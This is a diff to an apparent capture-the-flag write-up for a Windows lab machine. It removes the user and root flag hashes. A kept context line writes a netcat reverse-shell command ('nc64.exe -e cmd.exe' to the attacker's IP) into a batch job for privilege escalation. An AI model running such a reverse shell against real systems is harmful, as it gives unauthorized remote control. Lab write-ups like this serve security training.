@@ -331,7 +331,6 @@ daniel@MARKUPC:\Users\daniel\Desktop> dir
 ...
 
 daniel@MARKUPC:\Users\daniel\Desktop> more user.txt
-032d2fc8952a8c24e39c8f0ee9918ef7
 daniel@MARKUPC:\Users\daniel\Desktop> cd C:\
 daniel@MARKUPC:\> dir
 
@@ -433,12 +432,3 @@ echo C:\Log-Management\nc64.exe -e cmd.exe {MyIP} {port} > job.bat
 - Wait for the connection from the remote host to the nc listener
 - We are root inside the system
 - The root flag is in `C:\Users\Administrator\Desktop\root.txt`
-
-
----
-
-## FLAGS
-
-USER: 032d2fc8952a8c24e39c8f0ee9918ef7
-
-ROOT: f574a3e7650cebd8c39784299cb570f8
